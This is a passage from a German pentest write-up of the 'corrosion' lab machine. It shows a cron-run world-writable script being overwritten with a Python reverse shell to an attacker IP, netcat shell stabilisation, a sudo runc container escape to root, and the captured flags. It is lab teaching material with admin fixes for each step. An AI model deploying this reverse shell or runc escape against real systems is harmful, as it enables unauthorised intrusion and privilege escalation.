+            <p class="evaluation"><strong>Bewertung:</strong> Falsch gesetzte Berechtigungen auf `/home/bob/user.txt` ermöglichen `randy` das Lesen des Flags. Die Information über `.selected_editor` ist weniger relevant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren (obwohl es technisch `bob` gehört). Weiter nach Eskalationspfaden suchen, z.B. im Verzeichnis `/opt`.<br><strong>Empfehlung (Admin):</strong> Berechtigungen von Home-Verzeichnissen und Dateien darin korrekt setzen (Standard ist oft 700 oder 750 für Verzeichnisse, 600 oder 640 für Dateien).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:/opt$ <span class="command">ls -la</span></div>
+                    <pre>
+total 12
+drwxr-xr-x  2 root root 4096 Feb  2  2022 .
+drwxr-xr-x 20 root root 4096 Jan 30  2022 ..
+<span class="command">-rwxrwxrwx  1 root root  149 Feb  2  2022 simpleurlencode.py</span>
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:/opt$ <span class="command">cat simpleurlencode.py</span></div>
+                    <pre>
+#!/usr/bin/python3
+
+import urllib.parse
+
+string = input("Url Encode String: ")
+input = urllib.parse.quote(string)
+print("Encoded String: " + input)
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:/opt$ <span class="command">uname -a</span></div>
+                    <pre>
+Linux corrosion 5.13.0-28-generic #31~20.04.1-Ubuntu SMP Wed Jan 19 14:08:10 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:/opt$ <span class="command">dmesg</span></div>
+                    <pre>
+[...] <!-- Gekürzte dmesg Ausgabe -->
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Untersuchung des `/opt`-Verzeichnisses enthüllt ein Python-Skript `simpleurlencode.py`, das `root` gehört, aber **weltweit schreibbar** ist (`-rwxrwxrwx`). Das Skript selbst ist harmlos. Die Kernel-Version ist 5.13.0-28. Die `dmesg`-Ausgabe wird überprüft (keine offensichtlichen Hinweise).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritische Schwachstelle!** Ein von `root` ausgeführtes, aber weltweit schreibbares Skript ist ein klassischer Vektor für Privilegieneskalation, wenn dieses Skript von einem privilegierten Prozess (z.B. einem Cronjob als `root` oder einem anderen Benutzer) ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1. Überprüfen, ob ein Cronjob dieses Skript ausführt (z.B. mit `pspy` oder durch Beobachtung der Änderungszeiten).
+                2. Wenn ja, das Skript mit einer Reverse-Shell-Payload überschreiben.
+                3. Einen Listener starten und auf die eingehende Verbindung warten.
+            <br><strong>Empfehlung (Admin):</strong> **Sofort beheben!** Weltweit schreibbare Berechtigungen für Skripte, insbesondere wenn sie `root` gehören oder von privilegierten Prozessen ausgeführt werden könnten, sind extrem gefährlich. Berechtigungen korrekt setzen (`chmod 755` oder restriktiver). Cronjobs überprüfen.</p>
+
+            <!-- Cronjob Exploit -->
+             <p class="analysis"><strong>Analyse (Cronjob Exploit):</strong> Es wird angenommen, dass ein Cronjob `/opt/simpleurlencode.py` als Benutzer `bob` ausführt (basierend auf der später erhaltenen Shell). Das Skript wird mit einer Python-Reverse-Shell-Payload überschrieben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Annahme: nano wurde verwendet, um den Inhalt zu ändern -->
+                    <div class="prompt">randy@corrosion:/home$ <span class="command">nano /opt/simpleurlencode.py</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:/home$ <span class="command">cat /opt/simpleurlencode.py</span></div>
+                    <pre>
+#!/usr/bin/python3
+
+import os
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.2.130",1234)) <!-- IP des Angreifers -->
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                    <pre>
+listening on [any] 1234 ...
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Angreifer-Maschine, nach Wartezeit -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                    <pre>
+listening on [any] 1234 ...
+<span class="password">connect to [192.168.2.130] from (UNKNOWN) [192.168.2.116] 55224</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="command">id</span>
+<span class="password">uid=1001(bob) gid=1001(bob) groups=1001(bob)</span>
+$
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript `/opt/simpleurlencode.py` wird mit einer Python-Reverse-Shell überschrieben, die sich zum Angreifer (192.168.2.130:1234) verbindet. Ein Netcat-Listener wird gestartet. Nach einiger Wartezeit (Implikation: Cronjob läuft) kommt eine Verbindung herein. Der `id`-Befehl zeigt, dass die Shell als Benutzer `bob` (UID 1001) läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Durch das Überschreiben des weltweit schreibbaren Skripts und die Ausführung durch einen Cronjob wurde von `randy` zu `bob` eskaliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren und als `bob` nach weiteren Eskalationsmöglichkeiten suchen (`sudo -l`).<br><strong>Empfehlung (Admin):</strong> Weltweit schreibbares Skript und unsicheren Cronjob entfernen/korrigieren.</p>
+
+             <!-- Shell Stabilisierung (bob) -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Auf Angreifer Maschine -->
+                    <pre>
+$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="prompt">bob@corrosion:~$</span> <span class="command">export TERM=xterm</span>
+export TERM=xterm
+<span class="prompt">bob@corrosion:~$</span> <span class="command">^Z</span>
+zsh: suspended  nc -lvnp 1234
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 1234
+                     <span class="command">reset</span>
+<span class="prompt">bob@corrosion:~$</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Reverse Shell als `bob` wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Stabile Shell für weitere Aktionen verfügbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `sudo -l` für `bob` prüfen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="privilege-escalation-bob-root">
+            <h2>Privilege Escalation (bob -> root via runc)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bob@corrosion:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for bob on corrosion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bob may run the following commands on corrosion:
+    <span class="password">(root) NOPASSWD: /usr/sbin/runc</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` für `bob` zeigt, dass dieser Benutzer `/usr/sbin/runc` als `root` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Privilegieneskalationsvektor!** Das Ausführen des Container-Runtimes `runc` als `root` erlaubt typischerweise einen Container-Escape und somit Root-Zugriff auf dem Host-System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den bekannten `runc`-Escape-Exploit durchführen:
+                1. Verzeichnisstruktur für einen Container erstellen.
+                2. `runc spec` ausführen, um eine Standard-`config.json` zu generieren.
+                3. `config.json` modifizieren, um das Root-Verzeichnis des Hosts (`/`) in den Container zu mounten.
+                4. Den Container mit `sudo runc run ...` starten, um eine Root-Shell auf dem Host zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> **Sofort beheben!** Niemals `runc` oder ähnliche Container-Tools über `sudo` erlauben, da dies effektiv Root-Zugriff gewährt. Diese `sudo`-Regel entfernen.</p>
+
+            <p class="analysis"><strong>Proof of Concept: Privilege Escalation via sudo runc Escape</strong><br>
+            Die folgenden Schritte demonstrieren die Ausnutzung der `sudo`-Regel für `runc`, um Root-Rechte zu erlangen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bob@corrosion:~$ <span class="command">/usr/sbin/runc --help</span></div>
+                     <pre>[...]</pre> <!-- Gekürzte Hilfe -->
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">bob@corrosion:~$ <span class="command">cd /home/bob</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">bob@corrosion:~$ <span class="command">mkdir -p container01/rootfs</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bob@corrosion:~$ <span class="command">cd container01</span></div>
+                     <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bob@corrosion:~/container01$ <span class="command">/usr/sbin/runc spec</span></div>
+                     <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">bob@corrosion:~/container01$ <span class="command">ls</span></div>
+                    <pre>
+config.json  rootfs
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Verzeichnisstruktur für den Container wird erstellt und `runc spec` generiert die Standardkonfigurationsdatei `config.json`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den Exploit abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `config.json` modifizieren.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `config.json` wird bearbeitet (z.B. mit `nano` oder `vi`), um einen Bind-Mount hinzuzufügen, der das Root-Verzeichnis des Hosts (`/`) in das Root-Verzeichnis des Containers (`/`) einbindet.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Auszug aus der modifizierten config.json -->
+                    <pre>
+        "hostname": "runc",
+        "mounts": [
+                <span class="command">{</span>
+                        <span class="command">"type": "bind",</span>
+                        <span class="command">"source": "/",</span>
+                        <span class="command">"destination": "/",</span>
+                        <span class="command">"options": ["rbind", "rw", "rprivate" ]</span>
+                <span class="command">},</span>
+                {
+                        "destination": "/proc",
+                        "type": "proc",
+                        "source": "proc"
+                },
+                [...]
+                    </pre> <!-- Gekürzte Darstellung, relevanter Teil hervorgehoben -->
+                 </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Konfiguration ist nun so angepasst, dass der Container vollen Zugriff auf das Host-Dateisystem hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Container mit `sudo runc run` starten.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">bob@corrosion:~/container01$ <span class="command">sudo /usr/sbin/runc run mycont</span></div>
+                    <pre>
+<span class="password">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+#
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo /usr/sbin/runc run mycont` startet den Container mit der manipulierten Konfiguration. Da das Host-Wurzelverzeichnis im Container gemountet ist, erhält die im Container gestartete Shell (`/bin/sh` laut Standard-Spec) Root-Zugriff auf den Host. Der Prompt wechselt zu `#` und `id` bestätigt `uid=0(root)`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Privilegieneskalation zu Root über `runc` war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Unsichere `sudo`-Regel für `runc` entfernen.</p>
+        </section>
+
+        <section id="flags">
+             <h2>Flags</h2>
+
+             <div class="flag-container">
+                 <!-- User Flag Eintrag (bob's flag, gelesen als randy) -->
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/bob/user.txt</div>
+                    <div class="flag-value"><span class="password">d3a6cef5b73fa1fb233ed6a0e3b9de01</span></div>
+                </div>
+
+                 <!-- Root Flag Eintrag -->
+                 <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt"># <span class="command">pwd</span></div>
+                         <pre>/home/bob/container01</pre> <!-- Beispiel -->
+                         <div class="prompt"># <span class="command">cd /root</span></div>
+                         <div class="prompt"># <span class="command">ls</span></div>
+                         <pre>administrationtools  backups  knock  root.txt  snap</pre>
+                         <div class="prompt"># <span class="command">cat root.txt</span></div>
+                         <pre><span class="password">18e8141ab1333a87c35e1fad5b394d66</span></pre>
+                      </div>
+                 </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">18e8141ab1333a87c35e1fad5b394d66</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird nach `/root` gewechselt und die Datei `root.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Root-Flag wurde erfolgreich extrahiert. Der Penetrationstest ist abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 25. April 2023</p>
+    </footer>
+</body>
+</html>
